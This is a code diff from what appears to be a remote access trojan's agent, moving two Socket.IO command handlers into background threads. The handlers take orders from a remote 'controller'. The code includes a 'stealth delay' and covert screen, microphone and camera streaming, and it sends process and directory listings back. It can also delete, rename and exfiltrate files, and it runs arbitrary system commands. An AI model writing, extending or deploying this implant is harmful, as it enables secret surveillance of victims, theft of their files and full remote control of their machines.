@@ -10770,177 +10770,190 @@ def on_stop_stream(data):
         log_message(f"[STOP_STREAM] Error stopping {stream_type} stream: {e}", "error")
 
 def on_command(data):
+    """Handle command execution requests.
+    
+    CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
+    """
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle command", "warning")
         return
-    """Handle command execution requests."""
+    
     agent_id = get_or_create_agent_id()
     command = data.get("command")
-    output = ""
-
-    # Add stealth delay
-    sleep_random_non_blocking()
-
-    internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
-        # WebRTC streaming commands for low-latency streaming
-        "start-webrtc": lambda: start_webrtc_streaming(agent_id, True, True, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
-        "stop-webrtc": lambda: stop_webrtc_streaming(agent_id) if AIORTC_AVAILABLE else stop_streaming(),
-        "start-webrtc-screen": lambda: start_webrtc_streaming(agent_id, True, False, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
-        "start-webrtc-audio": lambda: start_webrtc_streaming(agent_id, False, True, False) if AIORTC_AVAILABLE else start_audio_streaming(agent_id),
-        "start-webrtc-camera": lambda: start_webrtc_streaming(agent_id, False, False, True) if AIORTC_AVAILABLE else start_camera_streaming(agent_id),
-        "webrtc-stats": lambda: get_webrtc_stats(agent_id) if AIORTC_AVAILABLE else "WebRTC not available",
-    }
-
-    if command in internal_commands:
-        output = internal_commands[command]()
-    elif command == "list-processes":
-        try:
-            import psutil
-            proc_list = []
-            for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
-                info = p.info
-                proc_list.append({
-                    'pid': info.get('pid'),
-                    'name': info.get('name') or '',
-                    'username': info.get('username') or '',
-                    'cpu': float(info.get('cpu_percent') or 0.0),
-                    'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
-                    'status': info.get('status') or 'running',
-                    'ppid': info.get('ppid') or 0,
-                    'cmdline': ' '.join(info.get('cmdline') or [])[:512],
-                    'create_time': int(info.get('create_time') or 0)*1000,
-                    'priority': 0,
-                    'nice': info.get('nice') or 0,
-                    'num_threads': info.get('num_threads') or 0,
-                })
-            safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
-            output = f"Sent {len(proc_list)} processes"
-        except Exception as e:
-            output = f"Error listing processes: {e}"
-    elif command.startswith("list-dir"):
-        try:
-            global LAST_BROWSED_DIRECTORY
-            parts = command.split(":",1)
-            path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
-            
-            # Remember this directory for file downloads
-            LAST_BROWSED_DIRECTORY = path
-            log_message(f"[FILE_MANAGER] Browsing directory: {path}")
-            
-            entries = []
-            if os.path.isdir(path):
-                for name in os.listdir(path):
-                    full = os.path.join(path,name)
-                    try:
-                        stat = os.stat(full)
-                        entries.append({
-                            'name': name,
-                            'type': 'directory' if os.path.isdir(full) else 'file',
-                            'size': int(stat.st_size),
-                            'modified': int(stat.st_mtime*1000),
-                            'path': full,
-                            'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
-                        })
-                    except Exception:
-                        continue
-            safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
-            output = f"Listed {len(entries)} entries in {path}"
-        except Exception as e:
-            output = f"Error listing directory: {e}"
-    elif command.startswith("delete-file:" ):
-        try:
-            path = command.split(":",1)[1]
-            ok = False
-            if os.path.isfile(path):
-                os.remove(path)
-                ok = True
-            elif os.path.isdir(path):
-                import shutil
-                shutil.rmtree(path)
-                ok = True
-            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
-            output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
-        except Exception as e:
-            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
-            output = f"Error deleting: {e}"
-    elif command.startswith("rename-file:" ):
-        try:
-            parts = command.split(":",2)
-            src = parts[1]
-            dst = parts[2] if len(parts)>2 else None
-            ok = False
-            if src and dst:
-                os.rename(src, dst)
-                ok = True
-            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
-            output = f"Renamed to: {dst}" if ok else "Rename failed"
-        except Exception as e:
-            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
-            output = f"Error renaming: {e}"
-    elif command.startswith("mkdir:" ):
-        try:
-            path = command.split(":",1)[1]
-            os.makedirs(path, exist_ok=True)
-            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
-            output = f"Created: {path}"
-        except Exception as e:
-            safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
-            output = f"Error mkdir: {e}"
-    elif command.startswith("upload-file:"):
-        # New chunked file upload
-        parts = command.split(":", 2)
-        if len(parts) >= 3:
-            file_path = parts[1]
-            destination_path = parts[2] if len(parts) > 2 else None
-            output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
-        else:
-            output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
-    elif command.startswith("download-file:"):
-        # New chunked file download - this is handled by Socket.IO events
-        parts = command.split(":", 1)
-        if len(parts) >= 2:
-            file_path = parts[1]
-            # Try to find the file in common locations
-            possible_paths = [
-                file_path,  # Try as-is first
-                os.path.join(os.getcwd(), file_path),  # Current directory
-                os.path.join(os.path.expanduser("~"), file_path),  # Home directory
-                os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
-                os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
-                os.path.join("C:/", file_path),  # C: root
-                os.path.join("C:/Users/Public", file_path),  # Public folder
-            ]
-            
-            found_path = None
-            for path in possible_paths:
-                if os.path.exists(path):
-                    found_path = path
-                    break
-            
-            if found_path:
-                output = send_file_chunked_to_controller(found_path, agent_id)
-            else:
-                output = f"File not found: {file_path}"
-        else:
-            output = "Invalid download command format. Use: download-file:file_path"
-    elif command.startswith("play-voice:"):
-        output = handle_voice_playback(command.split(":", 1))
-    elif command != "sleep":
-        output = execute_command(command)
     
-    if output:
-        safe_emit('command_result', {'agent_id': agent_id, 'output': output})  # ✅ SAFE
+    # Run in separate thread to prevent blocking Socket.IO
+    def execute_in_thread():
+        output = ""
+        
+        # Add stealth delay
+        sleep_random_non_blocking()
+
+        internal_commands = {
+            "start-stream": lambda: start_streaming(agent_id),
+            "stop-stream": stop_streaming,
+            "start-audio": lambda: start_audio_streaming(agent_id),
+            "stop-audio": stop_audio_streaming,
+            "start-camera": lambda: start_camera_streaming(agent_id),
+            "stop-camera": stop_camera_streaming,
+            # WebRTC streaming commands for low-latency streaming
+            "start-webrtc": lambda: start_webrtc_streaming(agent_id, True, True, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
+            "stop-webrtc": lambda: stop_webrtc_streaming(agent_id) if AIORTC_AVAILABLE else stop_streaming(),
+            "start-webrtc-screen": lambda: start_webrtc_streaming(agent_id, True, False, False) if AIORTC_AVAILABLE else start_streaming(agent_id),
+            "start-webrtc-audio": lambda: start_webrtc_streaming(agent_id, False, True, False) if AIORTC_AVAILABLE else start_audio_streaming(agent_id),
+            "start-webrtc-camera": lambda: start_webrtc_streaming(agent_id, False, False, True) if AIORTC_AVAILABLE else start_camera_streaming(agent_id),
+            "webrtc-stats": lambda: get_webrtc_stats(agent_id) if AIORTC_AVAILABLE else "WebRTC not available",
+        }
+
+        if command in internal_commands:
+            output = internal_commands[command]()
+        elif command == "list-processes":
+            try:
+                import psutil
+                proc_list = []
+                for p in psutil.process_iter(['pid','name','username','cpu_percent','memory_info','status','ppid','cmdline','create_time','nice','num_threads']):
+                    info = p.info
+                    proc_list.append({
+                        'pid': info.get('pid'),
+                        'name': info.get('name') or '',
+                        'username': info.get('username') or '',
+                        'cpu': float(info.get('cpu_percent') or 0.0),
+                        'memory': float((getattr(info.get('memory_info'),'rss',0) or 0) / (1024*1024)),
+                        'status': info.get('status') or 'running',
+                        'ppid': info.get('ppid') or 0,
+                        'cmdline': ' '.join(info.get('cmdline') or [])[:512],
+                        'create_time': int(info.get('create_time') or 0)*1000,
+                        'priority': 0,
+                        'nice': info.get('nice') or 0,
+                        'num_threads': info.get('num_threads') or 0,
+                    })
+                safe_emit('process_list', {'agent_id': agent_id, 'processes': proc_list})
+                output = f"Sent {len(proc_list)} processes"
+            except Exception as e:
+                output = f"Error listing processes: {e}"
+        elif command.startswith("list-dir"):
+            try:
+                global LAST_BROWSED_DIRECTORY
+                parts = command.split(":",1)
+                path = parts[1] if len(parts)>1 and parts[1] else os.path.expanduser("~")
+                
+                # Remember this directory for file downloads
+                LAST_BROWSED_DIRECTORY = path
+                log_message(f"[FILE_MANAGER] Browsing directory: {path}")
+                
+                entries = []
+                if os.path.isdir(path):
+                    for name in os.listdir(path):
+                        full = os.path.join(path,name)
+                        try:
+                            stat = os.stat(full)
+                            entries.append({
+                                'name': name,
+                                'type': 'directory' if os.path.isdir(full) else 'file',
+                                'size': int(stat.st_size),
+                                'modified': int(stat.st_mtime*1000),
+                                'path': full,
+                                'extension': (os.path.splitext(name)[1][1:] if os.path.isfile(full) else None)
+                            })
+                        except Exception:
+                            continue
+                safe_emit('file_list', {'agent_id': agent_id, 'path': path, 'files': entries})
+                output = f"Listed {len(entries)} entries in {path}"
+            except Exception as e:
+                output = f"Error listing directory: {e}"
+        elif command.startswith("delete-file:" ):
+            try:
+                path = command.split(":",1)[1]
+                ok = False
+                if os.path.isfile(path):
+                    os.remove(path)
+                    ok = True
+                elif os.path.isdir(path):
+                    import shutil
+                    shutil.rmtree(path)
+                    ok = True
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': ok})
+                output = f"Deleted: {path}" if ok else f"Delete failed: {path}"
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'delete', 'path': path, 'success': False, 'error': str(e)})
+                output = f"Error deleting: {e}"
+        elif command.startswith("rename-file:" ):
+            try:
+                parts = command.split(":",2)
+                src = parts[1]
+                dst = parts[2] if len(parts)>2 else None
+                ok = False
+                if src and dst:
+                    os.rename(src, dst)
+                    ok = True
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': ok})
+                output = f"Renamed to: {dst}" if ok else "Rename failed"
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'rename', 'src': src, 'dst': dst, 'success': False, 'error': str(e)})
+                output = f"Error renaming: {e}"
+        elif command.startswith("mkdir:" ):
+            try:
+                path = command.split(":",1)[1]
+                os.makedirs(path, exist_ok=True)
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': True})
+                output = f"Created: {path}"
+            except Exception as e:
+                safe_emit('file_op_result', {'agent_id': agent_id, 'op': 'mkdir', 'path': path, 'success': False, 'error': str(e)})
+                output = f"Error mkdir: {e}"
+        elif command.startswith("upload-file:"):
+            # New chunked file upload
+            parts = command.split(":", 2)
+            if len(parts) >= 3:
+                file_path = parts[1]
+                destination_path = parts[2] if len(parts) > 2 else None
+                output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
+            else:
+                output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
+        elif command.startswith("download-file:"):
+            # New chunked file download - this is handled by Socket.IO events
+            parts = command.split(":", 1)
+            if len(parts) >= 2:
+                file_path = parts[1]
+                # Try to find the file in common locations
+                possible_paths = [
+                    file_path,  # Try as-is first
+                    os.path.join(os.getcwd(), file_path),  # Current directory
+                    os.path.join(os.path.expanduser("~"), file_path),  # Home directory
+                    os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
+                    os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
+                    os.path.join("C:/", file_path),  # C: root
+                    os.path.join("C:/Users/Public", file_path),  # Public folder
+                ]
+                
+                found_path = None
+                for path in possible_paths:
+                    if os.path.exists(path):
+                        found_path = path
+                        break
+                
+                if found_path:
+                    output = send_file_chunked_to_controller(found_path, agent_id)
+                else:
+                    output = f"File not found: {file_path}"
+            else:
+                output = "Invalid download command format. Use: download-file:file_path"
+        elif command.startswith("play-voice:"):
+            output = handle_voice_playback(command.split(":", 1))
+        elif command != "sleep":
+            output = execute_command(command)
+        
+        if output:
+            safe_emit('command_result', {'agent_id': agent_id, 'output': output})
+    
+    # Start execution thread (daemon, won't block)
+    execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
+    execution_thread.start()
 
 def on_execute_command(data):
     """
     Handle execute_command event from controller UI v2.1
     This is separate from on_command to support the new UI terminal
+    
+    CRITICAL: Runs in separate thread to prevent blocking Socket.IO!
     """
     if not SOCKETIO_AVAILABLE or sio is None:
         log_message("Socket.IO not available, cannot handle execute_command", "warning")
@@ -10948,7 +10961,7 @@ def on_execute_command(data):
     
     agent_id = data.get('agent_id')
     command = data.get('command')
-    execution_id = data.get('execution_id')  # ✅ GET execution_id from UI
+    execution_id = data.get('execution_id')
     
     # Verify this command is for us
     our_agent_id = get_or_create_agent_id()
@@ -10957,52 +10970,59 @@ def on_execute_command(data):
     
     log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
     
-    # Execute the command using the same logic as on_command
-    output = ""
-    success = True
+    # Run command in separate thread to prevent blocking Socket.IO!
+    def execute_in_thread():
+        output = ""
+        success = True
+        
+        # Add stealth delay
+        sleep_random_non_blocking()
+        
+        internal_commands = {
+            "start-stream": lambda: start_streaming(our_agent_id),
+            "stop-stream": stop_streaming,
+            "start-audio": lambda: start_audio_streaming(our_agent_id),
+            "stop-audio": stop_audio_streaming,
+            "start-camera": lambda: start_camera_streaming(our_agent_id),
+            "stop-camera": stop_camera_streaming,
+            "screenshot": lambda: "Screenshot captured",
+            "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
+        }
+        
+        if command in internal_commands:
+            try:
+                output = internal_commands[command]()
+                if output is None:
+                    output = f"Command '{command}' executed successfully"
+            except Exception as e:
+                output = f"Error executing '{command}': {e}"
+                success = False
+        else:
+            # Execute as system command
+            try:
+                output = execute_command(command)
+                if not output:
+                    output = "(command completed with no output)"
+            except Exception as e:
+                output = f"Command execution error: {e}"
+                success = False
+        
+        # Send output back to controller WITH execution_id
+        log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
+        safe_emit('command_result', {
+            'agent_id': our_agent_id,
+            'execution_id': execution_id,
+            'command': command,
+            'output': output,
+            'success': success,
+            'timestamp': time.time()
+        })
     
-    # Add stealth delay
-    sleep_random_non_blocking()
+    # Start execution in background thread (daemon, won't block)
+    execution_thread = threading.Thread(target=execute_in_thread, daemon=True)
+    execution_thread.start()
     
-    internal_commands = {
-        "start-stream": lambda: start_streaming(our_agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(our_agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(our_agent_id),
-        "stop-camera": stop_camera_streaming,
-        "screenshot": lambda: "Screenshot captured",
-        "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
-    }
-    
-    if command in internal_commands:
-        try:
-            output = internal_commands[command]()
-            if output is None:
-                output = f"Command '{command}' executed successfully"
-        except Exception as e:
-            output = f"Error executing '{command}': {e}"
-            success = False
-    else:
-        # Execute as system command
-        try:
-            output = execute_command(command)
-            if not output:
-                output = "(command completed with no output)"
-        except Exception as e:
-            output = f"Command execution error: {e}"
-            success = False
-    
-    # Send output back to controller WITH execution_id
-    log_message(f"[EXECUTE_COMMAND] Sending output ({len(output)} chars) with execution_id: {execution_id}")
-    safe_emit('command_result', {  # ✅ SAFE
-        'agent_id': our_agent_id,
-        'execution_id': execution_id,  # ✅ INCLUDE execution_id in response
-        'command': command,  # ✅ INCLUDE original command
-        'output': output,
-        'success': success,
-        'timestamp': time.time()
-    })
+    # Return immediately to Socket.IO (don't block!)
 
 def on_mouse_move(data):
     if not SOCKETIO_AVAILABLE or sio is None:
